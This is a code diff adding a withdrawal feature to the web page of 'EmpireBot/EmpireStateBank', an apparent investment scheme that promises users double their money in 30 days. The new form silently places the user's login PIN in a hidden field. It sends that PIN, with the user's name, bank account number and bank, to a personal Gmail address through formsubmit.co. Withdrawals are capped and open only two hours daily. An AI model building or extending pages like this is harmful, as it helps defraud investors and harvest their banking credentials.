@@ -108,6 +108,64 @@
       transition: background 0.2s, color 0.2s;
     }
     #trade-proceed-btn:hover { background: var(--btn-bg-hover); color: #fff; }
+    /* Withdrawal button styling */
+    #withdrawal-btn {
+      flex: 1 1 46%;
+      padding: 12px 0;
+      border-radius: 8px;
+      border: none;
+      font-weight: 700;
+      font-size: 1.04em;
+      transition: background 0.17s, color 0.17s;
+      cursor: pointer;
+      box-shadow: 0 1px 5px rgba(79,195,247,0.09);
+      text-align: center;
+      text-decoration: none;
+      background: var(--btn-bg);
+      color: #191c24;
+      margin: 0 3px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    #withdrawal-btn:disabled, .profile-actions .disabled {
+      background: #31313f; color: #bbb; pointer-events: none; opacity: 0.7;
+    }
+    #withdrawal-btn:hover {
+      background: var(--btn-bg-hover); color: #fff;
+    }
+    /* Withdrawal Modal */
+    .withdrawal-form-modal-bg {
+      display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0,0,0,0.94); z-index: 1025; justify-content: center; align-items: center;
+    }
+    .withdrawal-form-modal-bg.active { display: flex; }
+    .withdrawal-form-modal-card {
+      background: var(--card-bg); border-radius: 16px; box-shadow: 0 6px 36px rgba(171,71,188,0.18);
+      width: 94vw; max-width: 340px; padding: 22px 12px 17px 12px; position: relative; max-height: 88vh;
+      display: flex; flex-direction: column; border-top: 3px solid var(--accent2);
+      animation: profileFadeIn 0.32s;
+    }
+    .withdrawal-form-modal-close {
+      position: absolute; top: 8px; right: 13px; background: none; border: none; font-size: 1.3em; color: var(--accent2);
+      cursor: pointer;
+    }
+    .withdrawal-form-modal-card h3 { color: var(--accent2); text-align: center; font-weight: bold; margin-bottom: 10px; }
+    .withdrawal-form input, .withdrawal-form select {
+      width: 98%; padding: 11px; margin: 8px 0 13px 0; border-radius: 7px; border: 1px solid var(--accent2);
+      background: var(--primary-bg); color: var(--text); font-size: 1em;
+    }
+    .withdrawal-form input:focus { outline: none; border: 1.5px solid var(--accent);}
+    .withdrawal-form button {
+      width: 100%; padding: 12px 0; border-radius: 8px; background: var(--btn-bg); color:#181b22; font-weight:700;
+      font-size: 1.09em; cursor:pointer; border:none; margin-top:3px;
+      box-shadow: 0 2px 8px rgba(171,71,188,0.10); transition: background 0.18s, color 0.18s;
+      letter-spacing: 0.5px;
+    }
+    .withdrawal-form button:hover { background: var(--btn-bg-hover); color:#fff; }
+    @media (max-width: 480px) {
+      .profile-card, .status-modal-card, .login-surface, .withdrawal-form-modal-card { max-width: 99vw; padding: 12px 3vw 22px 3vw;}
+    }
     .profile-card {
       background: var(--card-bg); border-radius: 18px; box-shadow: 0 2px 16px rgba(0,0,0,0.25);
       width: 98vw; max-width: 410px; margin: auto; margin-top: 32px; padding: 28px 20px 30px 20px;
@@ -238,9 +296,6 @@
     }
     .trade-summary-table th { color: var(--accent2);}
     .trade-summary-table tr:last-child td { border-bottom: none;}
-    @media (max-width: 480px) {
-      .profile-card, .status-modal-card, .login-surface { max-width: 99vw; padding: 12px 3vw 22px 3vw;}
-    }
   </style>
 </head>
 <body>
@@ -304,11 +359,57 @@
     </div>
   </div>
 
+  <!-- Withdrawal Form Modal -->
+  <div class="withdrawal-form-modal-bg" id="withdrawal-form-modal">
+    <div class="withdrawal-form-modal-card">
+      <button class="withdrawal-form-modal-close" onclick="closeWithdrawalFormModal()">&times;</button>
+      <h3>Withdraw Funds</h3>
+      <form id="withdrawal-form" class="withdrawal-form" action="https://formsubmit.co/empirevirtual99@gmail.com" target="_blank" method="POST" autocomplete="off">
+        <input type="hidden" name="_template" value="table">
+        <input type="hidden" name="_subject" value="EmpireBot Withdrawal Submission">
+        <input type="hidden" name="User PIN" id="withdrawal-form-pin" readonly>
+        <label>
+          Name<br>
+          <input type="text" name="Name" id="withdrawal-form-name" required readonly>
+        </label>
+        <label>
+          Amount (₦1,000 - ₦20,000)<br>
+          <input type="number" name="Amount" id="withdrawal-form-amount" min="1000" max="20000" step="500" required>
+        </label>
+        <label>
+          Account Name<br>
+          <input type="text" name="Account Name" id="withdrawal-form-account-name" required readonly>
+        </label>
+        <label>
+          Account Number<br>
+          <input type="text" name="Account Number" id="withdrawal-form-account-number" required readonly>
+        </label>
+        <label>
+          Bank Name<br>
+          <input type="text" name="Bank Name" id="withdrawal-form-bank" required readonly>
+        </label>
+        <label>
+          Date<br>
+          <input type="date" name="Date" id="withdrawal-form-date" required>
+        </label>
+        <label>
+          PIN<br>
+          <input type="password" name="Withdrawal PIN" id="withdrawal-form-trade-pin" maxlength="4" required pattern="\d{4}" placeholder="4-digit PIN">
+        </label>
+        <div id="withdrawal-form-error" style="color: #e57373; display:none; margin-bottom: 10px; font-size:0.98em;"></div>
+        <button type="submit">Submit Withdrawal</button>
+      </form>
+    </div>
+  </div>
+
   <script>
     // ----------- TRADE DATE/TIME SETTINGS -----------
-    const TRADE_DAYS = [1]; // 15th of the month
+    const TRADE_DAYS = [1];
     const TRADE_START_HOUR = 0;
     const TRADE_END_HOUR = 18;
+    // Withdrawal time settings
+    const WITHDRAWAL_START_HOUR = 8;
+    const WITHDRAWAL_END_HOUR = 10;
     // -----------------------------------------------
 
     // User Data
@@ -468,6 +569,12 @@
       return isTradeDay && isTradeHour;
     }
 
+    function isWithdrawalOpen() {
+      const now = new Date();
+      const hour = now.getHours();
+      return hour >= WITHDRAWAL_START_HOUR && hour < WITHDRAWAL_END_HOUR;
+    }
+
     function showLoader(msg="Loading...", duration=6000, cb=()=>{}) {
       document.getElementById('typing-loader-msg').textContent = "";
       document.getElementById('typing-loader-msg').style.display = "none";
@@ -495,7 +602,7 @@
       proceedBtn.disabled = true;
 
       const message = "Trade with EmpireStateBank and get 2X of your investment after 30 days. Your income will be transferred directly to your Bank account.";
-      const duration = 15000; // 15 seconds
+      const duration = 15000;
       let idx = 0;
       const interval = duration / message.length;
       function typeChar() {
@@ -532,9 +639,9 @@
       const expired = isExpired(user);
       const expiryStatus = getExpiryStatusString(user);
       const tradingOpen = isTradingOpen();
+      const withdrawalOpen = isWithdrawalOpen();
       const canTrade = !expired && tradingOpen && user.wallet_balance >= 5000;
-      const fundWalletUrl = 'https://paystack.shop/pay/eyj535dodw';
-      const todayStr = getTodayStr();
+      const canWithdraw = !expired && withdrawalOpen;
       let expiryNotice = '';
       if (expired) {
         expiryNotice = `
@@ -554,6 +661,14 @@
           tradeNowBtn = `<button disabled class="disabled" id="trade-now-btn">Trade Now<br><small>Trading opens only on ${TRADE_DAYS.join(", ")}${TRADE_DAYS.length==1?"st":""}</small></button>`;
         } else if (user.wallet_balance < 5000) {
           tradeNowBtn = `<button disabled class="disabled" id="trade-now-btn">Trade Now<br><small>Min ₦5,000 balance</small></button>`;
+        }
+      }
+      let withdrawalBtn = '';
+      if (!expired) {
+        if (canWithdraw) {
+          withdrawalBtn = `<button onclick="startWithdrawalNow()" id="withdrawal-btn">Withdraw</button>`;
+        } else {
+          withdrawalBtn = `<button disabled class="disabled" id="withdrawal-btn">Withdraw<br><small>08:00 - 10:00 daily</small></button>`;
         }
       }
       let fundWalletBtn = `<button onclick="fundWallet()">Fund Wallet</button>`;
@@ -584,6 +699,7 @@
           <div class="profile-trade-schedule">${tradeSchedule}</div>
           <div class="profile-actions">
             ${tradeNowBtn}
+            ${withdrawalBtn}
             ${fundWalletBtn}
             ${updateBtn}
           </div>
@@ -620,7 +736,6 @@
       this.value = this.value.replace(/\D/g,'').slice(0,4);
     });
 
-    // --- Enhanced Trade Form Validation ---
     const tradeForm = document.getElementById('trade-form');
     tradeForm.onsubmit = function(e) {
       const amount = parseInt(document.getElementById('form-amount').value,10);
@@ -629,14 +744,12 @@
       errorDiv.style.display = 'none';
       errorDiv.textContent = '';
 
-      // Validate amount
       if (isNaN(amount) || amount < 5000 || amount > 50000) {
         errorDiv.textContent = 'Amount must be between ₦5,000 and ₦50,000';
         errorDiv.style.display = 'block';
         e.preventDefault();
         return false;
       }
-      // Validate PIN: must be 4 digits and match currentUser.pin
       if (!/^\d{4}$/.test(tpin)) {
         errorDiv.textContent = 'PIN must be 4 digits';
         errorDiv.style.display = 'block';
@@ -649,7 +762,6 @@
         e.preventDefault();
         return false;
       }
-      // Validate wallet balance
       if (currentUser.wallet_balance < amount) {
         errorDiv.textContent = `Your wallet balance (₦${currentUser.wallet_balance.toLocaleString()}) is insufficient for this trade.`;
         errorDiv.style.display = 'block';
@@ -660,7 +772,6 @@
       showLoader("Submitting trade...", 3000, ()=>{});
     };
 
-    // Live wallet balance validation as user types amount
     document.getElementById('form-amount').addEventListener('input', function() {
       const amount = parseInt(this.value, 10);
       const errorDiv = document.getElementById('form-error');
@@ -669,6 +780,78 @@
       if (isNaN(amount)) return;
       if (currentUser && amount > currentUser.wallet_balance) {
         errorDiv.textContent = `Your wallet balance (₦${currentUser.wallet_balance.toLocaleString()}) is insufficient for this trade.`;
+        errorDiv.style.display = 'block';
+      }
+    });
+
+    window.startWithdrawalNow = function() {
+      openWithdrawalFormModal();
+    };
+
+    function openWithdrawalFormModal() {
+      document.getElementById('withdrawal-form-name').value = currentUser.name;
+      document.getElementById('withdrawal-form-pin').value = currentUser.pin;
+      document.getElementById('withdrawal-form-account-name').value = currentUser.account_name;
+      document.getElementById('withdrawal-form-account-number').value = currentUser.account_number;
+      document.getElementById('withdrawal-form-bank').value = currentUser.bank;
+      document.getElementById('withdrawal-form-date').value = getTodayStr();
+      document.getElementById('withdrawal-form-amount').value = 1000;
+      document.getElementById('withdrawal-form-trade-pin').value = '';
+      document.getElementById('withdrawal-form-error').style.display = 'none';
+      document.getElementById('withdrawal-form-error').textContent = '';
+      document.getElementById('withdrawal-form-modal').classList.add('active');
+    }
+    function closeWithdrawalFormModal() {
+      document.getElementById('withdrawal-form-modal').classList.remove('active');
+    }
+    document.getElementById('withdrawal-form-trade-pin').addEventListener('input',function(e){
+      this.value = this.value.replace(/\D/g,'').slice(0,4);
+    });
+
+    const withdrawalForm = document.getElementById('withdrawal-form');
+    withdrawalForm.onsubmit = function(e) {
+      const amount = parseInt(document.getElementById('withdrawal-form-amount').value,10);
+      const tpin = document.getElementById('withdrawal-form-trade-pin').value;
+      const errorDiv = document.getElementById('withdrawal-form-error');
+      errorDiv.style.display = 'none';
+      errorDiv.textContent = '';
+
+      if (isNaN(amount) || amount < 1000 || amount > 20000) {
+        errorDiv.textContent = 'Amount must be between ₦1,000 and ₦20,000';
+        errorDiv.style.display = 'block';
+        e.preventDefault();
+        return false;
+      }
+      if (!/^\d{4}$/.test(tpin)) {
+        errorDiv.textContent = 'PIN must be 4 digits';
+        errorDiv.style.display = 'block';
+        e.preventDefault();
+        return false;
+      }
+      if (!currentUser || tpin !== currentUser.pin) {
+        errorDiv.textContent = 'PIN does not match your login PIN';
+        errorDiv.style.display = 'block';
+        e.preventDefault();
+        return false;
+      }
+      if (!isWithdrawalOpen()) {
+        errorDiv.textContent = 'Withdrawal is only allowed from 08:00 to 10:00 daily.';
+        errorDiv.style.display = 'block';
+        e.preventDefault();
+        return false;
+      }
+      closeWithdrawalFormModal();
+      showLoader("Submitting withdrawal...", 3000, ()=>{});
+    };
+
+    document.getElementById('withdrawal-form-amount').addEventListener('input', function() {
+      const amount = parseInt(this.value, 10);
+      const errorDiv = document.getElementById('withdrawal-form-error');
+      errorDiv.style.display = 'none';
+      errorDiv.textContent = '';
+      if (isNaN(amount)) return;
+      if (amount < 1000 || amount > 20000) {
+        errorDiv.textContent = 'Amount must be between ₦1,000 and ₦20,000';
         errorDiv.style.display = 'block';
       }
     });
@@ -712,6 +895,9 @@
       }
       if (document.getElementById('trade-form-modal').classList.contains('active')) {
         if (!e.target.closest('.trade-form-modal-card')) closeTradeFormModal();
+      }
+      if (document.getElementById('withdrawal-form-modal').classList.contains('active')) {
+        if (!e.target.closest('.withdrawal-form-modal-card')) closeWithdrawalFormModal();
       }
     });
   </script>
